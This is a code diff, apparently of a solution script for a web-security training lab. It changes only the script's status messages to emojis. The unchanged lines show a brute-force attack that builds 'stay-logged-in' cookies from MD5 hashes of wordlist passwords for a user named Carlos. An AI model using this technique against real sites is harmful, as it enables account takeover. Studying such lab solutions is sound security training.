@@ -10,7 +10,7 @@ proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 
 
 def access_carlos_account(url):
-    print("(+) Brute-forcing Carlos's password...")
+    print("✅ Brute-forcing Carlos's password...")
     with open('..\\Auth Wordlists\\password-wordlist.txt','r') as file:
         for pwd in file:
             hashed_pwd = 'carlos:' + hashlib.md5(pwd.rstrip('\r\n').encode("utf-8")).hexdigest()
@@ -23,14 +23,14 @@ def access_carlos_account(url):
             cookies = {'stay-logged-in': str_pwd}
             req = r.get(myaccount_url, cookies=cookies, verify=False, proxies=proxies)
             if "Log out" in req.text:
-                print("(+) Carlo's password is: " +pwd)
+                print("✅ Carlo's password is: " +pwd)
                 sys.exit(1)
-        print("(-) Couldn't find Carlos's password.")
+        print("❌ Couldn't find Carlos's password.")
 
 def main():
     if len(sys.argv) != 2:
-        print("(+) Usage: %s <url>" %sys.argv[0])
-        print("(+) Example: %s www.example.com" %sys.argv[0])
+        print("⚠️  Usage: %s <url>" %sys.argv[0])
+        print("⚠️  Example: %s www.example.com" %sys.argv[0])
         sys.exit(1)
 
     url = sys.argv[1]
